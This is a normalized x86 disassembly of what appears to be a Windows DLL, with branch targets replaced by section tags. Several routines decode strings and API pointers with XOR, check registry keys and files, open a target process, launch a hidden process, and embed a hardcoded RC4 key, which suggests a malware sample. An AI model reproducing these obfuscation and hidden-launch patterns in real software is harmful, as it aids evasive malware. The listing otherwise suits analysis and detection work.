jbe r-xdata
mov ecx [ ebp + 0x8 ]
movzx eax [ ecx ]
mov ecx [ esp + 0xc ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0xc ]
call eax
mov ecx 0xffff
cmp cx ax
je r-xdata
jg r-xdata
add [ ebp + 0x8 ] 0x2
add [ esp + 0x10 ] 0x1
adc [ esp + 0x14 ] 0x0
add [ ebp + 0xc ] 0xffffffff
adc edi 0xffffffff
mov [ ebp + 0x10 ] edi
cmp edi ebx
jg r-xdata
test esi esi
je r-xdata
jl r-xdata
mov ecx [ esp + 0xc ]
mov eax [ ebp + 0x8 ]
mov edx [ ecx + 0x24 ]
lea edi [ esi + esi ]
push edi
push eax
mov eax [ edx ]
push eax
call sub_1007f580
add [ ebp + 0x8 ] edi
mov eax [ esp + 0x18 ]
mov ecx [ eax + 0x34 ]
add esp 0xc
add [ esp + 0x10 ] esi
adc [ esp + 0x14 ] ebx
sub [ ebp + 0xc ] esi
sbb [ ebp + 0x10 ] ebx
sub [ ecx ] esi
mov eax [ eax + 0x24 ]
add [ eax ] edi
mov edi [ ebp + 0x10 ]
jmp r-xdata
jl r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
test edi edi
jg r-xdata
mov esi [ ebp + 0xc ]
mov ebx edi
cmp [ ebp + 0xc ] esi
jae r-xdata
sub_10030db0
push ecx
push ebx
push edi
xor edi edi
mov ebx ecx
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
push eax
mov edx ebx
mov ecx esi
mov [ esi + 0x54 ] edi
call sub_10052c10
mov [ esi + 0x4 ] edi
cmp [ ebx + 0x84 ] 0x8
jb r-xdata
add ebx 0x70
mov ebx [ ebx + 0x70 ]
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea ecx [ edi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0x14 ] eax
call sub_1007f580
add esp 0xc
pop edi
mov eax esi
pop ebx
pop ecx
retn
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x14 ] edi
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
sub_10030e40
push ebp
mov ebp esp
sub esp 0x84
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x40
and edx 0xff
mov [ ebp + eax * 2 - 0x80 ] dx
inc eax
cmp eax 0x3c
jb r-xdata
lea ecx [ ebp - 0x84 ]
push ecx
push 0x20119
xor eax eax
push eax
lea edx [ ebp - 0x80 ]
push edx
push 0x80000002
mov [ ebp - 0x8 ] ax
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x84 ]
push eax
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x1
call sub_10032529
mov esp ebp
pop ebp
retn
xor eax eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10030ed0
call sub_10019f38
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_10002016
pop ecx
push 0x3
call sub_10041309
int3
push 0x1
push 0x40000015
push 0x3
call sub_1001a73c
add esp 0xc
sub_10030f03
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
test eax eax
jle r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
pop ebp
retn
push eax
push [ ebp + 0x10 ]
call sub_1004c8bd
pop ecx
pop ecx
sub_10030f32
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
and edx [ ebp + 0xc ]
not ecx
and ecx eax
or ecx edx
mov [ rw-data ] ecx
pop ebp
retn
sub_10030f80
push ebp
mov ebp esp
sub esp 0x10
push 0x18
call sub_1002e3ac
xor edx edx
add esp 0x4
cmp eax edx
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
call sub_10032538
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_10055e2a
int3
mov ecx [ esi + 0x4 ]
mov [ eax ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x8 ] ecx
lea ecx [ eax + 0xc ]
mov [ eax + 0x14 ] dx
cmp ecx edx
je r-xdata
mov esp ebp
pop ebp
retn
mov edx [ edi ]
mov [ ecx ] edx
mov edx [ edi + 0x4 ]
mov [ ecx + 0x4 ] edx
sub_10030ff0
push ebp
mov ebp esp
sub esp 0x8
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
push ecx
push 0x1
lea edx [ ebp + 0x8 ]
push edx
lea eax [ ebp - 0x4 ]
push eax
call sub_10025a12
mov ax [ ebp - 0x4 ]
add esp 0x14
mov esp ebp
pop ebp
retn
sub_10031020
mov [ esi ] r--data
cmp [ esi + 0x84 ] 0x8
jb r-xdata
mov [ esi + 0x84 ] 0x7
mov [ esi + 0x80 ] 0x0
xor ecx ecx
mov [ esi + 0x70 ] cx
mov [ esi ] r--data
cmp [ esi + 0x40 ] 0x8
jb r-xdata
mov eax [ esi + 0x70 ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
mov [ esi + 0x40 ] 0x7
mov [ esi + 0x3c ] 0x0
mov [ esi + 0x2c ] ax
cmp [ esi + 0x20 ] 0x8
jb r-xdata
mov edx [ esi + 0x2c ]
push edx
call sub_1000a86e
add esp 0x4
xor edx edx
mov [ esi + 0x20 ] 0x7
mov [ esi + 0x1c ] 0x0
mov [ esi + 0xc ] dx
retn
mov ecx [ esi + 0xc ]
push ecx
call sub_1000a86e
add esp 0x4
sub_100310b0
push ebp
mov ebp esp
push 0xffffffff
push sub_10086e80
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
xor edi edi
push 0x10
mov [ ebp - 0x4 ] edi
call sub_1002e3ac
add esp 0x4
cmp eax edi
je r-xdata
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov ecx 0x1
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
mov edi eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4 ] edi
mov [ ebx ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ esi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_10031170
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10021ec0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_100311a0
push ebp
mov ebp esp
sub esp 0xac
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x47
and edx 0xff
mov [ ebp + eax * 2 - 0x58 ] dx
inc eax
cmp eax 0x29
jb r-xdata
push esi
mov esi [ GetFileAttributesW@IAT ]
lea ecx [ ebp - 0x58 ]
xor eax eax
push ecx
mov [ ebp - 0x6 ] ax
call esi
cmp eax 0xffffffff
je r-xdata
lea edx [ ebp - 0xac ]
mov eax 0x26
call sub_10037e30
push edx
call esi
xor ecx ecx
cmp eax 0xffffffff
setne cl
pop esi
mov eax ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10031232
push 0x28
mov eax sub_10085438
call sub_10026266
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_10008d33
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_100575c5
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_100312c0
push ebp
mov ebp esp
sub esp 0xb10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
test eax eax
jne r-xdata
push eax
call [ StrToIntW@IAT ]
mov edi eax
push edi
push 0x0
push 0x410
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push 0x104
lea eax [ ebp - 0x28c ]
push eax
push 0x0
push esi
call [ GetModuleFileNameExW@IAT ]
test eax eax
push esi
mov al 0x38
jne r-xdata
lea eax [ esi + 0x2 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ rw-data ]
mov [ ebp - 0xab0 ] edx
xor [ ebp - 0xab0 ] al
xor [ ebp - 0xaaf ] al
xor [ ebp - 0xaae ] al
xor [ ebp - 0xaad ] al
call [ ebp - 0xab0 ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0xab0 ] ecx
xor [ ebp - 0xab0 ] al
xor [ ebp - 0xaaf ] al
xor [ ebp - 0xaae ] al
xor [ ebp - 0xaad ] al
call [ ebp - 0xab0 ]
mov eax 0x3
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28c ]
push eax
call [ PathQuoteSpacesW@IAT ]
lea edx [ ebp - 0x7c ]
mov eax 0x10a
call sub_10069020
mov ecx edx
push ecx
mov edx 0x7ffffffe
mov eax 0x30c
lea ecx [ ebp - 0x8a4 ]
call sub_10072780
test eax eax
je r-xdata
mov eax 0x4
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax 0xa0
call sub_10069020
push edi
push edx
mov eax 0x16
lea ebx [ ebp - 0x4c ]
call sub_10039a80
add esp 0x8
test eax eax
je r-xdata
mov eax 0x5
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x4c ]
push eax
lea esi [ ebp - 0x8a4 ]
call sub_1005dbf0
test eax eax
je r-xdata
mov eax 0x6
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x74 ]
mov eax 0xd0
call sub_10069020
mov ecx edx
push ecx
lea esi [ ebp - 0x8a4 ]
call sub_1005dbf0
test eax eax
je r-xdata
mov eax 0x7
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x28c ]
push edx
lea esi [ ebp - 0x8a4 ]
call sub_1005dbf0
test eax eax
je r-xdata
mov eax 0x8
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x20 ]
mov eax 0x11a
call sub_10069020
mov eax edx
push eax
lea esi [ ebp - 0x8a4 ]
call sub_1005dbf0
test eax eax
je r-xdata
mov eax 0x9
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x34 ]
mov eax 0xbc
call sub_10069020
push 0x104
lea ecx [ ebp - 0xaac ]
push ecx
push edx
call [ ExpandEnvironmentStringsW@IAT ]
test eax eax
jne r-xdata
mov eax 0xa
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push 0x44
lea eax [ ebp - 0xb0c ]
push 0x0
push eax
call sub_1007f8f0
add esp 0xc
xor eax eax
lea ecx [ ebp - 0xac0 ]
push ecx
lea edx [ ebp - 0xb0c ]
push edx
push eax
push eax
push 0x8000000
push eax
push eax
push eax
mov [ ebp - 0xac0 ] eax
mov [ ebp - 0xabc ] eax
mov [ ebp - 0xab8 ] eax
mov [ ebp - 0xab4 ] eax
lea eax [ ebp - 0x8a4 ]
push eax
lea ecx [ ebp - 0xaac ]
push ecx
mov [ ebp - 0xb0c ] 0x44
call [ CreateProcessW@IAT ]
mov ecx [ ebp - 0x8 ]
neg eax
sbb eax eax
pop edi
and eax 0xfffffff4
pop esi
xor ecx ebp
add eax 0xc
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax 0xb
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_100315c0
push 0x6c
mov eax sub_10085660
call sub_10047689
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x64 ] eax
mov eax [ ecx + 0x14 ]
mov edx 0x3000
and eax edx
cmp eax edx
jne r-xdata
lea eax [ ebp - 0x78 ]
push eax
call sub_10007a10
and [ ebp - 0x4 ] 0x0
push eax
call sub_1004aa10
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x70 ] eax
call sub_1002be90
mov ecx [ ebp - 0x70 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_10026407
lea ebx [ edi + 0x8 ]
push ebx
push 0x0
push 0x30
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x6c ] ebx
call sub_10032181
movzx eax ax
add esp 0xc
push [ ebp - 0x64 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x68 ]
mov ecx esi
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x51 ] 0x0
call sub_1002839c
test al al
jne r-xdata
push ebx
push ecx
push [ ebp - 0x64 ]
push esi
push [ ebp - 0x68 ]
push edi
call sub_10014296
add esp 0x18
jmp r-xdata
mov eax [ ebp - 0x48 ]
xor edi edi
cmp [ ebp - 0x34 ] 0x10
mov [ ebp - 0x49 ] 0x0
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x5c ] edi
jae r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
call sub_100262c3
retn
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x0
push 0x2b
call sub_10032181
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
push [ ebp - 0x64 ]
mov ecx esi
call sub_1002839c
test al al
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x68 ]
mov [ eax ] 0x2b
jmp r-xdata
mov ebx [ ebp - 0x64 ]
push ebx
mov ecx esi
call sub_1002839c
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x0
push 0x2d
call sub_10032181
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
inc eax
mov ecx esi
mov [ ebp - 0x50 ] eax
call sub_1000eff4
mov edi [ ebp - 0x60 ]
test edi edi
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x38 ] edi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov [ eax ] 0x2d
push ebx
mov ecx esi
call sub_1002839c
test al al
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x70 ]
mov eax [ ecx ]
movzx edi [ esi + 0x6 ]
call [ eax + 0x4 ]
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x49 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x70 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax ax
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x74 ] edi
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
push ebx
mov ecx esi
call sub_1002839c
test al al
je r-xdata
call sub_1003d7d5
mov eax [ eax ]
mov ecx [ ebp - 0x50 ]
mov al [ eax ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
mov ecx esi
call sub_1000eff4
cmp [ ebp - 0x60 ] 0x0
jne r-xdata
movzx eax [ ebp - 0x58 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] 0x0
call sub_10021130
push [ ebp - 0x64 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_1002839c
test al al
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
push ebx
mov ecx esi
call sub_1002839c
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x5c ] 0x0
jge r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
cmp [ ebp - 0x60 ] 0x24
jl r-xdata
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
lea edx [ ebp - 0x48 ]
movzx eax [ esi + 0x6 ]
mov ebx [ ebp - 0x58 ]
cmp bx ax
ja r-xdata
mov ecx esi
call sub_100255aa
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x68 ]
jmp r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_100255aa
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x5c ]
mov [ eax ] 0x30
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x5c ]
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_10005b50
jmp r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ ebp - 0x58 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_100255aa
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ eax ] 0x0
call sub_10005b50
mov eax [ ebp - 0x5c ]
mov eax [ ebp - 0x50 ]
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x65
call sub_10032181
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_100255aa
dec [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1000eff4
mov ebx [ ebp - 0x58 ]
cmp [ esi + 0x6 ] bx
jne r-xdata
mov ecx esi
call sub_100255aa
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1000eff4
push [ ebp - 0x64 ]
mov ecx esi
call sub_1002839c
test al al
je r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + edi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
movzx ecx bx
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_100255aa
cmp edi 0x24
jge r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov ecx esi
mov [ eax ] 0x65
call sub_1000eff4
push [ ebp - 0x64 ]
mov ecx esi
mov [ ebp - 0x49 ] 0x0
xor ebx ebx
call sub_1002839c
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x60 ] edi
je r-xdata
dec edi
je r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x74 ] 0x0
je r-xdata
cmp [ ebp - 0x60 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1000eff4
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov edi [ ebp - 0x64 ]
push edi
mov ecx esi
call sub_1002839c
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x45
call sub_10032181
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
mov al [ esi + 0x6 ]
mov ecx [ ebp - 0x50 ]
sub al bl
add al 0x30
inc [ ebp - 0x50 ]
inc [ ebp - 0x60 ]
mov [ ecx ] al
mov ecx esi
call sub_100255aa
test edi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x5c ]
jmp r-xdata
mov al [ esi + 0x6 ]
sub al [ ebp - 0x58 ]
mov ecx [ ebp - 0x50 ]
add al 0x30
inc [ ebp - 0x50 ]
mov [ ecx ] al
inc edi
mov ecx esi
call sub_100255aa
push edi
mov ecx esi
call sub_1002839c
test al al
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2b
call sub_10032181
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + edi ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x74 ]
jne r-xdata
mov ecx esi
call sub_100255aa
movzx eax [ esi + 0x6 ]
cmp ax bx
jne r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_100255aa
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2b
jmp r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x51 ] 0x1
mov [ ebp - 0x51 ] 0x1
inc edi
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10042a70
inc edi
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x60 ] 0x0
je r-xdata
cmp [ eax + edi ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
mov ax [ ebp - 0x58 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x49 ] bl
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1000eff4
push edi
mov ecx esi
call sub_1002839c
test al al
je r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2d
call sub_10032181
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
inc [ ebp - 0x50 ]
mov ecx esi
call sub_1000eff4
movzx eax [ esi + 0x6 ]
mov ecx [ ebp - 0x50 ]
sub al bl
add al 0x30
inc [ ebp - 0x50 ]
inc [ ebp - 0x60 ]
mov [ ecx ] al
mov ecx esi
call sub_100255aa
mov ecx esi
call sub_1000eff4
push [ ebp - 0x64 ]
mov ecx esi
call sub_1002839c
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
jmp r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2d
inc [ eax + edi ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ ebp - 0x58 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_100255aa
cmp ebx 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1000eff4
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov al [ esi + 0x6 ]
sub al [ ebp - 0x58 ]
mov ecx [ ebp - 0x50 ]
add al 0x30
inc [ ebp - 0x50 ]
mov [ ecx ] al
inc ebx
mov ecx esi
call sub_100255aa
sub_10031c60
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
call sub_1000c4b2
mov esi eax
add esp 0x4
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x8
call sub_1005b670
mov ecx [ eax ]
mov edx [ ebp + 0xc ]
mov [ edx ] ecx
mov eax esi
sub_10031c90
push ebp
mov ebp esp
push 0xffffffff
push sub_10086570
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x4
xor ebx ebx
push ebx
mov esi ecx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] r--data
jmp r-xdata
push 0x1c
lea edx [ ebp - 0x2c ]
push edx
mov [ ebp - 0x2c ] 0x208
mov [ ebp - 0x28 ] 0x6801
mov [ ebp - 0x24 ] 0x10
mov [ ebp - 0x20 ] 0x526278b5
mov [ ebp - 0x1c ] 0xd7243e98
mov [ ebp - 0x18 ] 0x7ceec63b
mov [ ebp - 0x14 ] 0x6291edb9
mov eax [ ecx ]
mov eax [ eax + 0x10 ]
push edi
push esi
call eax
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x30 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x30 ]
cmp esi ebx
je r-xdata
